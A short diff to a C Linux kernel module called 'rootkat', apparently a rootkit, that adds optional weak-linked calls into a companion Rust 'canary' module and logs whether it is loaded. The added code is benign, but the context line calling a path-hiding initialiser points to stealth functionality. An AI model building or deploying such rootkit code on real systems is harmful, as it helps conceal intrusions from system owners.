@@ -20,11 +20,28 @@
 
 #define ROOTKAT_TAG "rootkat: "
 
+/*
+ * Cross-module Rust integration: rootkat_rust_canary.ko (built only on
+ * matrix entries with KERNEL_RUST=enabled) exports these. Weak-linked
+ * so when the Rust LKM isn't loaded the symbols stay NULL and we skip
+ * the call gracefully — keeps the C module loadable on its own.
+ */
+extern u32 rootkat_canary_tick(void) __attribute__((weak));
+extern u32 rootkat_canary_value(void) __attribute__((weak));
+
 static int __init rootkat_init(void)
 {
 	int rc;
 
 	pr_info(ROOTKAT_TAG "loading\n");
+
+	if (rootkat_canary_tick) {
+		u32 ticks = rootkat_canary_tick();
+
+		pr_info(ROOTKAT_TAG "rust canary present, tick=%u\n", ticks);
+	} else {
+		pr_info(ROOTKAT_TAG "rust canary not loaded (C-only build)\n");
+	}
 
 	rootkat_hidden_unix_paths_init();
 
